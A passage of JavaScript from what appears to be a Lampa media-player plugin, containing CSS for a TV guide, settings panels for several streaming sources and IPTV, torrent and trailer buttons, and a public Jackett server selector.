#e85555}.mds-tvg__prog-bell{position:absolute;top:.25em;right:.5em;font-size:.8em;color:#e85555}.mds-tvg__prog-t{font-size:.95em;font-weight:500;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:2;line-clamp:2;-webkit-box-orient:vertical;line-height:1.3}.mds-tvg__prog-tm{font-size:.8em;color:rgba(255,255,255,0.35);margin-top:.08em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;font-variant-numeric:tabular-nums;overflow:hidden;max-height:1.4em}.mds-tvg__now{position:absolute;top:0;bottom:0;left:0;width:2px;z-index:10;pointer-events:none;-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%);transform:translateX(-50%)}.mds-tvg__now-head{position:absolute;top:.55em;left:-2px;-webkit-transform:translateX(2px);-ms-transform:translateX(2px);transform:translateX(2px);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;white-space:nowrap;z-index:1000;padding:.4em 1em .4em 1em;background:-webkit-gradient(linear,left top,left bottom,from(#fde047),color-stop(60%,#facc15),to(#eab308));background:-webkit-linear-gradient(top,#fde047 0,#facc15 60%,#eab308 100%);background:-o-linear-gradient(top,#fde047 0,#facc15 60%,#eab308 100%);background:linear-gradient(180deg,#fde047 0,#facc15 60%,#eab308 100%);-webkit-border-radius:1.1em .9em .9em 0;border-radius:1.1em .9em .9em 0;pointer-events:auto;-webkit-box-shadow:0 2px 8px rgba(0,0,0,0.15),inset 0 1px 0 rgba(255,255,255,0.4);box-shadow:0 2px 8px rgba(0,0,0,0.15),inset 0 1px 0 rgba(255,255,255,0.4)}.mds-tvg__now-head::after{content:'';position:absolute;bottom:-7px;left:0;width:12px;height:10px;background:#f5c613;-webkit-clip-path:polygon(0 60%,0 0,65% 0);clip-path:polygon(0 60%,0 0,65% 0)}.mds-tvg__now-time{font-size:.95em;font-weight:700;font-variant-numeric:tabular-nums;letter-spacing:.02em;color:#1a1a1a}.mds-tvg__now-line{position:absolute;top:0;bottom:0;left:0;width:2px;background:-webkit-gradient(linear,left top,left bottom,from(#facc15),to(#eab308));background:-webkit-linear-gradient(top,#facc15 0,#eab308 100%);background:-o-linear-gradient(top,#facc15 0,#eab308 100%);background:linear-gradient(180deg,#facc15 0,#eab308 100%);-webkit-box-shadow:0 0 8px rgba(234,179,8,0.4);box-shadow:0 0 8px rgba(234,179,8,0.4);-webkit-clip-path:inset(2.45em 0 0 0);clip-path:inset(2.45em 0 0 0)}.mds-tvg__preview{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;width:26%;min-width:14em;max-width:22em;position:relative;overflow:hidden;background:#000;border-right:1px solid rgba(255,255,255,0.08)}.mds-tvg__preview::before{content:'';display:block;padding-bottom:56.25%}.mds-tvg__preview--no-video .mds-tvg__preview-video{display:none}.mds-tvg__preview-video{position:absolute;top:0;left:0;width:100%;height:100%;-o-object-fit:cover;object-fit:cover}.mds-tvg__preview-logo{position:absolute;top:.4em;right:.4em;width:2.2em;height:1.8em;background:rgba(0,0,0,0.5);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;z-index:2;font-size:.65em;font-weight:700;color:#fff}.mds-tvg__preview-logo img{max-width:90%;max-height:90%;-o-object-fit:contain;object-fit:contain}.mds-tvg__preview-num{display:none}.mds-tvg__preview-caption{position:absolute;bottom:0;left:0;right:0;padding:.6em .8em .5em;background:-webkit-gradient(linear,left top,left bottom,from(transparent),color-stop(40%,rgba(0,0,0,0.5)),to(rgba(0,0,0,0.95)));background:-webkit-linear-gradient(top,transparent 0,rgba(0,0,0,0.5) 40%,rgba(0,0,0,0.95) 100%);background:-o-linear-gradient(top,transparent 0,rgba(0,0,0,0.5) 40%,rgba(0,0,0,0.95) 100%);background:linear-gradient(to bottom,transparent 0,rgba(0,0,0,0.5) 40%,rgba(0,0,0,0.95) 100%);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;gap:.15em;z-index:2}.mds-tvg__preview-pr{font-size:.95em;font-weight:600;white-space:nowrap;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;color:#fff}.mds-tvg__preview-ch{font-size:.8em;color:rgba(255,255,255,0.85)}.mds-tvg__inf{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-height:11em;max-height:13em;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;padding:.8em 1.2em;overflow:hidden;background:rgb(18.2181818182,29.4961038961,48.5818181818)}.mds-tvg__inf>*+*{margin-top:.5em}@supports(gap:.5em){.mds-tvg__inf{gap:.5em}.mds-tvg__inf>*+*{margin-top:0}}.mds-tvg__inf-head{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.mds-tvg__inf-head>*+*{margin-left:.8em}@supports(gap:.8em){.mds-tvg__inf-head{gap:.8em}.mds-tvg__inf-head>*+*{margin-left:0}}.mds-tvg__inf-logo{width:2.8em;height:2.8em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;background:rgba(255,255,255,0.08);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;overflow:hidden}.mds-tvg__inf-logo img{max-width:90%;max-height:90%;-o-object-fit:contain;object-fit:contain}.mds-tvg__inf-logo span{font-size:.7em;font-weight:700}.mds-tvg__inf-meta{font-size:.85em;color:rgba(255,255,255,0.7);white-space:nowrap;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis}.mds-tvg__inf-pr{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;min-height:1.4em;font-size:1.2em;font-weight:600;color:#fff;white-space:nowrap;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;line-height:1.3}.mds-tvg__inf-progress{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;height:.35em;background:rgba(255,255,255,0.2);overflow:hidden;-webkit-border-radius:.2em;border-radius:.2em;margin:.35em 0 0}.mds-tvg__inf-progress-bar{height:100%;background:#4a9eff;-webkit-transition:width .3s;-o-transition:width .3s;transition:width .3s}.mds-tvg__inf-desc{font-size:.88em;color:rgba(255,255,255,0.6);display:-webkit-box;-webkit-line-clamp:5;line-clamp:5;-webkit-box-orient:vertical;overflow:hidden;line-height:1.45;min-height:4.5em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.mds-tvg__inf-time{font-size:.9em;font-variant-numeric:tabular-nums;color:rgba(255,255,255,0.5);margin-top:auto}@media(max-width:500px){.mds-tvg__bd{grid-template-columns:3.5em 1fr}.mds-tvg__top{-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column}.mds-tvg__preview{width:100%;min-width:0;max-width:none}.mds-tvg__preview-caption{padding:.4em .35em}.mds-tvg__preview-pr{font-size:.85em;white-space:normal;display:-webkit-box;-webkit-line-clamp:2;line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}.mds-tvg__preview-ch{font-size:.7em}.mds-tvg__inf-pr{font-size:1em}.mds-tvg__ch-hd{display:none}.mds-tvg__ch-name{display:none}.mds-tvg__logo{width:2.3em;height:1.9em}.mds-tvg__row--ch{padding:0 .3em;gap:0;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}.mds-tvg__title{font-size:1.1em}.mds-tvg__prog-t{font-size:.9em}.mds-tvg__prog-tm{font-size:.75em}.mds-tvg__inf{min-height:4em;max-height:6.5em;padding:.5em .8em}.mds-tvg__inf-logo{width:2.2em;height:2.2em}.mds-tvg__inf-ch{font-size:.8em}.mds-tvg__inf-pr{font-size:.9em;white-space:normal;display:-webkit-box;-webkit-line-clamp:2;line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}.mds-tvg__inf-desc{display:none}.mds-tvg__inf-time{font-size:.8em}}.modal .mds-tvg{position:fixed !important;top:0 !important;left:0 !important;right:0 !important;bottom:0 !important;width:100% !important;width:100vw;height:100% !important;height:100vh;min-height:100%;z-index:99999 !important}@media screen and (max-width:729px){.player.iptv .iptv-hud__content{-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;padding:5em 1em 10em;gap:1em}.player.iptv .iptv-hud__menu{width:100%;margin-right:0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.player.iptv .iptv-hud__program{width:100%;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-height:0}}.mds-tvg-remind{padding:.5em 0;text-align:left;max-width:100%}.mds-tvg-remind__head{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;margin-bottom:1em}.mds-tvg-remind__head>*+*{margin-left:1em}@supports(gap:1em){.mds-tvg-remind__head{gap:1em}.mds-tvg-remind__head>*+*{margin-left:0}}.mds-tvg-remind__head{padding:.7em 1em;background:rgba(255,255,255,0.05);-webkit-border-radius:.5em;border-radius:.5em;border-bottom:1px solid rgba(255,255,255,0.08)}.mds-tvg-remind__channel{font-size:1.2em;font-weight:600;color:rgba(255,255,255,0.9);letter-spacing:.02em;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-width:0;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}.mds-tvg-remind__time{font-size:1.25em;font-weight:600;color:#f3d26b;font-variant-numeric:tabular-nums;letter-spacing:.08em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.mds-tvg-remind__title{font-size:1.35em;font-weight:600;color:#f3d26b;line-height:1.35;margin-bottom:.8em;padding:.6em 0}.mds-tvg-remind__desc{font-size:.92em;color:rgba(255,255,255,0.68);line-height:1.5;margin:0;padding:.8em 0;border-top:1px solid rgba(255,255,255,0.06)}@media screen and (max-width:480px){.player-panel-iptv-item__prog{height:auto !important;min-height:auto}.player-panel-iptv-item__prog-item span{white-space:normal !important;overflow:visible !important;-o-text-overflow:unset !important;text-overflow:unset !important;max-width:none !important;word-break:break-word;line-height:1.35}.player-panel-iptv-item__left{width:22% !important}}@media screen and (max-width:480px) and (max-width:767px){.player-panel-iptv-item__left{width:28% !important}}@media screen and (max-width:480px){.player-panel-iptv-item__body{width:78% !important}}@media screen and (max-width:480px) and (max-width:767px){.player-panel-iptv-item__body{width:72% !important}}@media screen and (max-width:480px){.player-panel-iptv-item{-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.player-panel-iptv-item>.player-panel-iptv-item__prog-timeline{-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%;width:100%;-webkit-box-ordinal-group:0;-webkit-order:-1;-ms-flex-order:-1;order:-1;margin-left:0;margin-top:0;margin-bottom:.5em;padding-right:.6em;-webkit-box-sizing:border-box;box-sizing:border-box;height:.3em;min-height:4px}.player-panel-iptv-item>.player-panel-iptv-item__prog-timeline>div{height:100%;min-height:100%}}@media screen and (max-width:480px) and (max-width:580px){.player-panel-iptv-item>.player-panel-iptv-item__prog-timeline{padding-right:.4em}}\n        </style>\n    ");
	
    
		
		
		function FreeJaketOpt() {
		return;
			Lampa.Arrays.getKeys(Modss.jack).map(function (el){
			  jackets[el] = el.replace(/_/g,'.');
			});
			var params = Lampa.SettingsApi.getParam('parser')
			if(params){
				var param = params.find(function (p){
					return p.param.name == 'jackett_url2';
				});
				if(param) Lampa.Arrays.remove(params, param);
			}
		
      		Lampa.SettingsApi.addParam({
				component: 'parser',
				param: {
					name: 'jackett_url2', 
					type: 'select', 			
					values: jackets,
					default: Lampa.Arrays.getKeys(Modss.jack)[0]
				},
				field: {
					name: 'Публичные JACKett Ⓜ️', 			
					description: 'Обновится после выхода из настроек' 
				},
				onChange: function (value) { 	
					Lampa.Storage.set('jackett_url', Modss.jack[value].url);
					Lampa.Storage.set('jackett_key', Modss.jack[value].key);
					Lampa.Storage.set('jackett_interview',Modss.jack[value].interv);
					Lampa.Storage.set('parse_in_search', false);
					Lampa.Storage.set('parse_lang', Modss.jack[value].lang);
					Lampa.Settings.update();							
			 	},
				onRender: function (item) {
					setTimeout(function() {
						$('div[data-children="parser"]').on('hover:enter', function(){
							Lampa.Settings.update();							
						});
						if(!API || !API.length) window.location.reload();
						$('[data-name="jackett_url2"]').on('hover:enter', function (el){
							Lampa.Select.render().find('.selectbox-item__title').map(function(i, item){
								Modss.check($(item).text().toLowerCase().replace(/\./g,'_'), function(e){
									$(item).css('color', e ? '#23ff00' : '#d10000');
								});
							});
						});
					
						if(Lampa.Storage.field('parser_use')) {
							item.show();
							if(Boolean(Modss.jack[Lampa.Storage.get('jackett_url2')])) $('.settings-param__name', item).before('<div class="settings-param__status one '+(Modss.jack[Lampa.Storage.get('jackett_url2')].ok ? "active" : "error")+'"></div>');
							$('[data-name="jackett_url"] .settings-param__name').before('<div class="settings-param__status wait act"></div>');
							$('.settings-param__name', item).css('color','#f3d900');
							$('div[data-name="jackett_url2"]').insertAfter('div[data-children="parser"]');
							Modss.check($('.settings-param__value', item).text().toLowerCase().replace(/\./g,'_'), function(e){
								Modss.check(Lampa.Storage.get('jackett_url'));
								$($('.settings-param__status', item)).removeClass('active error wait').addClass(e ? 'active' : 'error');
							});
						} else item.hide();
					}, 50);
				}
			});
		}
		

		function addButton(data) {
			cards = data;
			Modss.serialInfo(cards);
			Modss.online();
			Modss.rating_kp_imdb(cards).then(function (e) {
				Modss.preload();
			})['catch'](function(e){
				Modss.preload();
			});
			$('.view--torrent').addClass('selector').empty().append('<svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 48 48" width="48px" height="48px"><path d="M 23.501953 4.125 C 12.485953 4.125 3.5019531 13.11 3.5019531 24.125 C 3.5019531 32.932677 9.2467538 40.435277 17.179688 43.091797 L 17.146484 42.996094 L 7 16 L 15 14 C 17.573 20.519 20.825516 32.721688 27.728516 30.929688 C 35.781516 28.948688 28.615 16.981172 27 12.076172 L 34 11 C 38.025862 19.563024 39.693648 25.901226 43.175781 27.089844 C 43.191423 27.095188 43.235077 27.103922 43.275391 27.113281 C 43.422576 26.137952 43.501953 25.140294 43.501953 24.125 C 43.501953 13.11 34.517953 4.125 23.501953 4.125 z M 34.904297 29.314453 C 34.250297 34.648453 28.811359 37.069578 21.943359 35.517578 L 26.316406 43.763672 L 26.392578 43.914062 C 33.176993 42.923925 38.872645 38.505764 41.660156 32.484375 C 41.603665 32.485465 41.546284 32.486418 41.529297 32.486328 C 38.928405 32.472567 36.607552 31.572967 34.904297 29.314453 z"/></svg><span>' + Lampa.Lang.translate('full_torrents') + '</span>');
			$('.view--trailer').empty().append("<svg enable-background='new 0 0 512 512' id='Layer_1' version='1.1' viewBox='0 0 512 512' xml:space='preserve' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><g><path fill='currentColor' d='M260.4,449c-57.1-1.8-111.4-3.2-165.7-5.3c-11.7-0.5-23.6-2.3-35-5c-21.4-5-36.2-17.9-43.8-39c-6.1-17-8.3-34.5-9.9-52.3   C2.5,305.6,2.5,263.8,4.2,222c1-23.6,1.6-47.4,7.9-70.3c3.8-13.7,8.4-27.1,19.5-37c11.7-10.5,25.4-16.8,41-17.5   c42.8-2.1,85.5-4.7,128.3-5.1c57.6-0.6,115.3,0.2,172.9,1.3c24.9,0.5,50,1.8,74.7,5c22.6,3,39.5,15.6,48.5,37.6   c6.9,16.9,9.5,34.6,11,52.6c3.9,45.1,4,90.2,1.8,135.3c-1.1,22.9-2.2,45.9-8.7,68.2c-7.4,25.6-23.1,42.5-49.3,48.3   c-10.2,2.2-20.8,3-31.2,3.4C366.2,445.7,311.9,447.4,260.4,449z M205.1,335.3c45.6-23.6,90.7-47,136.7-70.9   c-45.9-24-91-47.5-136.7-71.4C205.1,240.7,205.1,287.6,205.1,335.3z'/></g></svg><span>" + Lampa.Lang.translate('full_trailers') + "</span>");
		}

		if(Lampa.Activity.active() && Lampa.Activity.active().component == 'full'){
			if(!Lampa.Activity.active().activity.render().find('.view--modss_online').length){
				addButton(Lampa.Activity.active().card);
			}
		}
		Lampa.Listener.follow('full', function (e) {
			if (e.type == 'complite') {
				addButton(e.data.movie);
			}
		});
		Lampa.Listener.follow('activity', function (e) {
			if (e.component == 'full' && e.type == 'start') { 
				var button = Lampa.Activity.active().activity.render().find('.view--modss_online');
				if(button.length) {
					cards = e.object.card;
					Modss.online(button);
					Modss.last_view(e.object.card);
				}
			}
		});
		Lampa.Storage.listener.follow('change', function (e) {
		  //if(e.name == 'jackett_key' || e.name == 'jackett_url') Modss.check(e.value);
		});
		Lampa.Settings.listener.follow('open', function (e) {
			if (e.name == 'main') {
			
				if (Lampa.Settings.main().render().find('[data-component="pub_param"]').length == 0) {
					Lampa.SettingsApi.addComponent({
						component: 'pub_param',
						name: 'KinoPub',
						icon: '<svg viewBox="0 0 24 24" xml:space="preserve" xmlns="http://www.w3.org/2000/svg"><path d="M19.7.5H4.3C2.2.5.5 2.2.5 4.3v15.4c0 2.1 1.7 3.8 3.8 3.8h15.4c2.1 0 3.8-1.7 3.8-3.8V4.3c0-2.1-1.7-3.8-3.8-3.8zM13 14.6H8.6c-.3 0-.5.2-.5.5v4.2H6V4.7h7c2.7 0 5 2.2 5 5 0 2.7-2.2 4.9-5 4.9z" fill="#ffffff" class="fill-000000 fill-ffffff"></path><path d="M13 6.8H8.6c-.3 0-.5.2-.5.5V12c0 .3.2.5.5.5H13c1.6 0 2.8-1.3 2.8-2.8.1-1.6-1.2-2.9-2.8-2.9z" fill="#ffffff" class="fill-000000 fill-ffffff"></path></svg>'
					});
				}
				if (Lampa.Settings.main().render().find('[data-component="fork_param"]').length == 0) {
					Lampa.SettingsApi.addComponent({
						component: 'fork_param',
						name: 'ForkTV',
						icon: '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke="#ffffff" stroke-width="2" class="stroke-000000"><path d="M4.4 2h15.2A2.4 2.4 0 0 1 22 4.4v15.2a2.4 2.4 0 0 1-2.4 2.4H4.4A2.4 2.4 0 0 1 2 19.6V4.4A2.4 2.4 0 0 1 4.4 2Z"></path><path d="M12 20.902V9.502c-.026-2.733 1.507-3.867 4.6-3.4M9 13.5h6"></path></g></svg>'
					});
				}
				if (Lampa.Settings.main().render().find('[data-component="rezka_param"]').length == 0) {
					Lampa.SettingsApi.addComponent({
						component: 'rezka_param',
						name: 'HDRezka',
						icon: '<svg height="57" viewBox="0 0 58 57" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 20.3735V45H26.8281V34.1262H36.724V26.9806H26.8281V24.3916C26.8281 21.5955 28.9062 19.835 31.1823 19.835H39V13H26.8281C23.6615 13 20 15.4854 20 20.3735Z" fill="white"/><rect x="2" y="2" width="54" height="53" rx="5" stroke="white" stroke-width="4"/></svg>'
					});
				}
				if (Lampa.Settings.main().render().find('[data-component="filmix_param"]').length == 0) {
					Lampa.SettingsApi.addComponent({
						component: 'filmix_param',
						name: 'Filmix',
						icon: '<svg height="57" viewBox="0 0 58 57" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 20.3735V45H26.8281V34.1262H36.724V26.9806H26.8281V24.3916C26.8281 21.5955 28.9062 19.835 31.1823 19.835H39V13H26.8281C23.6615 13 20 15.4854 20 20.3735Z" fill="white"/><rect x="2" y="2" width="54" height="53" rx="5" stroke="white" stroke-width="4"/></svg>'
					});
				}
				if (Lampa.Settings.main().render().find('[data-component="modss_tv_param"]').length == 0) {
					Lampa.SettingsApi.addComponent({
						component: 'modss_tv_param',
						name: 'Modss-TV',
						icon: '<svg height="57px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" color="#fff" fill="currentColor" class="bi bi-tv"><path d="M2.5 13.5A.5.5 0 0 1 3 13h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zM13.991 3l.024.001a1.46 1.46 0 0 1 .538.143.757.757 0 0 1 .302.254c.067.1.145.277.145.602v5.991l-.001.024a1.464 1.464 0 0 1-.143.538.758.758 0 0 1-.254.302c-.1.067-.277.145-.602.145H2.009l-.024-.001a1.464 1.464 0 0 1-.538-.143.758.758 0 0 1-.302-.254C1.078 10.502 1 10.325 1 10V4.009l.001-.024a1.46 1.46 0 0 1 .143-.538.758.758 0 0 1 .254-.302C1.498 3.078 1.675 3 2 3h11.991zM14 2H2C0 2 0 4 0 4v6c0 2 2 2 2 2h12c2 0 2-2 2-2V4c0-2-2-2-2-2z"/></svg>'
					});
				}
				if (Lampa.Settings.main().render().find('[data-component="modss_online_param"]').length == 0) {
					Lampa.SettingsApi.addComponent({
						component: 'modss_online_param',
						name: 'Modss-Online',
						icon: '<svg height="57px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" color="#fff" fill="currentColor" class="bi bi-tv"><path d="M2.5 13.5A.5.5 0 0 1 3 13h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zM13.991 3l.024.001a1.46 1.46 0 0 1 .538.143.757.757 0 0 1 .302.254c.067.1.145.277.145.602v5.991l-.001.024a1.464 1.464 0 0 1-.143.538.758.758 0 0 1-.254.302c-.1.067-.277.145-.602.145H2.009l-.024-.001a1.464 1.464 0 0 1-.538-.143.758.758 0 0 1-.302-.254C1.078 10.502 1 10.325 1 10V4.009l.001-.024a1.46 1.46 0 0 1 .143-.538.758.758 0 0 1 .254-.302C1.498 3.078 1.675 3 2 3h11.991zM14 2H2C0 2 0 4 0 4v6c0 2 2 2 2 2h12c2 0 2-2 2-2V4c0-2-2-2-2-2z"/></svg>'
					});
				}
				if (Lampa.Settings.main().render().find('[data-component="modss_radio_param"]').length == 0) {
					Lampa.SettingsApi.addComponent({
						component: 'modss_radio_param',
						name: 'Modss-Radio',
						icon: '<svg height="57px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" color="#fff" fill="currentColor" class="bi bi-tv"><path d="M2.5 13.5A.5.5 0 0 1 3 13h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zM13.991 3l.024.001a1.46 1.46 0 0 1 .538.143.757.757 0 0 1 .302.254c.067.1.145.277.145.602v5.991l-.001.024a1.464 1.464 0 0 1-.143.538.758.758 0 0 1-.254.302c-.1.067-.277.145-.602.145H2.009l-.024-.001a1.464 1.464 0 0 1-.538-.143.758.758 0 0 1-.302-.254C1.078 10.502 1 10.325 1 10V4.009l.001-.024a1.46 1.46 0 0 1 .143-.538.758.758 0 0 1 .254-.302C1.498 3.078 1.675 3 2 3h11.991zM14 2H2C0 2 0 4 0 4v6c0 2 2 2 2 2h12c2 0 2-2 2-2V4c0-2-2-2-2-2z"/></svg>'
					});
				}
				Lampa.Settings.main().update();
				Lampa.Settings.main().render().find('[data-component="modss_radio_param"], [data-component="modss_online_param"], [data-component="filmix"], [data-component="rezka_param"], [data-component="pub_param"], [data-component="filmix_param"], [data-component="fork_param"], [data-component="modss_tv_param"]').addClass('hide');
				
				var interfaceElement = Lampa.Settings.main().render().find('div[data-component="account"]');
				var settingsElement = Lampa.Settings.main().render().find('div[data-component="settings_modss"]');

				interfaceElement.after(settingsElement);

			}
			if (e.name == 'mods_proxy') {
				$('.settings__title').text(Lampa.Lang.translate('title_proxy') + " MODS's");
				var ads = ['<div style="padding: 1.5em 2em; padding-top: 10px;">', '<div style="background: #3e3e3e; padding: 1em; border-radius: 0.3em;">', '<div style="font-size: 1em; margin-bottom: 1em; color: #ffd402;">#{info_attention} ⚠</div>', '<div style="line-height: 1.4;">#{online_proxy_title_descr}</div>', '</div>', '</div>'].join('');
				e.body.find('[data-name="mods_proxy_all"]').before(Lampa.Lang.translate(ads));
			} else $('.settings__title').text(Lampa.Lang.translate('menu_settings'));
			if (e.name == 'fork_param') $('.settings__title').append(" ForkTV");
			if (e.name == 'filmix_param') {
				var ads = ['<div style="padding: 1.5em 2em; padding-top: 10px;">', '<div style="background: #3e3e3e; padding: 1em; border-radius: 0.3em;">', '<div style="font-size: 1em; margin-bottom: 1em; color: #ffd402;">#{info_attention} ⚠</div>', '<div style="line-height: 1.4;">#{filmix_info_descr}</div>', '</div>', '</div>'].join('');
				e.body.find('[data-static="true"]:eq(0)').after(Lampa.Lang.translate(ads));
				$('.settings__title').append(" Filmix");
			}
			if (e.name == 'pub_param') {
				var ads = ['<div style="padding: 1.5em 2em; padding-top: 10px;">', '<div style="background: #3e3e3e; padding: 1em; border-radius: 0.3em;">', '<div style="font-size: 1em; margin-bottom: 1em; color: #ffd402;">#{info_attention} ⚠</div>', '<div style="line-height: 1.4;">#{info_pub_descr} <span style="color: #24b4f9">kino.pub</span></div>', '</div>', '</div>'].join('');
				e.body.find('[data-static="true"]:eq(0)').after(Lampa.Lang.translate(ads));
				$('.settings__title').append(" KinoPub");
			}
			if (e.name == 'modss_online_param') {
			  $('.settings__title').text("MODS's Online");
			  var title = $('[data-name="priority_balanser"] .settings-param__value', e.body);
			  title.text(title.text().split('<').shift());
			}
			if (e.name == 'modss_radio_param') {
			  $('.settings__title').text("MODS's Radio");
			}
			if (e.name == 'modss_tv_param') {
			  $('.settings__title').text("Modss-TV");
			}
			if (e.name == 'settings_modss') {
			  $('.settings__title').text("MODS's 💎");
			  var title = $('[data-name="priority_balanser"] .settings-param__value', e.body);
			  title.text(title.text().split('<').shift());
			}
			if (e.name == 'parser') FreeJaketOpt();

			if (e.name == 'iptv_modss_guide') {
				var status = e.body.find('.update-guide-status');
				var parser = window.iptv_modss_guide_update_process;
				var listen = function listen() {
				  if (!parser) return;
				  parser.follow('start', function () {
					status.find('.settings-param__name').text(Lampa.Lang.translate('iptv_guide_status_update'));
					status.find('.settings-param__value').text(Lampa.Lang.translate('iptv_guide_status_parsing') + ' 0%');
				  });
				  parser.follow('percent', function (data) {
					status.find('.settings-param__value').text(Lampa.Lang.translate('iptv_guide_status_parsing') + ' ' + data.percent.toFixed(2) + '%');
				  });
				  parser.follow('finish', function (data) {
					status.find('.settings-param__name').text(Lampa.Lang.translate('iptv_guide_status_finish'));
					status.find('.settings-param__value').text(Lampa.Lang.translate('iptv_guide_status_channels') + ' - ' + data.count + ', ' + Lampa.Lang.translate('iptv_guide_status_date') + ' - ' + Lampa.Utils.parseTime(data.time).briefly);
				  });
				  parser.follow('error', function (data) {
					status.find('.settings-param__name').text(Lampa.Lang.translate('title_error'));
					status.find('.settings-param__value').text(data.text);
				  });
				};
				e.body.find('.update-guide-now').on('hover:enter', function () {
				  if (window.iptv_modss_guide_update_process) return Lampa.Noty.show(Lampa.Lang.translate('iptv_guide_status_update_wait'));
				  Guide.update(status);
				  parser = window.iptv_modss_guide_update_process;
				  listen();
				});
				var last_status = Lampa.Storage.get('iptv_modss_guide_updated_status', '{}');
				if (last_status.type) {
				  if (last_status.type == 'error') {
					status.find('.settings-param__name').text(Lampa.Lang.translate('title_error'));
					status.find('.settings-param__value').text(last_status.text);
				  }
				  if (last_status.type == 'finish') {
					status.find('.settings-param__value').text(Lampa.Lang.translate('iptv_guide_status_channels') + ' - ' + last_status.channels + ', ' + Lampa.Lang.translate('iptv_guide_status_date') + ' - ' + Lampa.Utils.parseTime(last_status.time).briefly);
				  }
				}
				if (parser) listen();
			}
			
		});
		if (Lampa.Manifest.app_digital >= 177) {
			Lampa.Storage.sync('my_colls', 'object_object');
			Lampa.Storage.sync('fav_chns', 'object_object');
			Lampa.Storage.sync('online_watched_last', 'object_object');
			
			var balansers_sync = ["veoveo","mango","uaflix","eneida","fxpro","flixsod","alloha","filmix","kinopub","hdr","hdrezka","aniliberty","dreamerscast","kodik","kinotochka","hdvb","collaps","starlight"];
			balansers_sync.forEach(function (name) {
				Lampa.Storage.sync('online_choice_' + name, 'object_object');
			});
		}
		function add() {
			if (window.__modssAddOnce) {
				return;
			}
			window.__modssAddOnce = true;
			Modss.init();
			$('body').append(Lampa.Template.get('modss_styles', {}, true));
			$('body').append(Lampa.Template.get('modss_push_modal_css', {}, true));
			$('body').append(Lampa.Template.get('hdgo_style', {}, true));
			$('body').append(Lampa.Template.get('mods_radio_style', {}, true));
			$('body').append(Lampa.Template.get('modss_online_css', {}, true));
			$('body').append(Lampa.Template.get('radio_style_modss', {}, true));
			$('body').append(Lampa.Template.get('modss_iptv_style', {}, true));
      
			//	Lampa.Storage.set('guide', '');
			setTimeout(function () {
				//if (window.innerHeight > 700 && Lampa.Storage.field('guide') == 'undefined') guide();
			}, 3000);
			
			
			Lampa.SettingsApi.addComponent({
				component: 'settings_modss',
				name: "MODS's 💎",
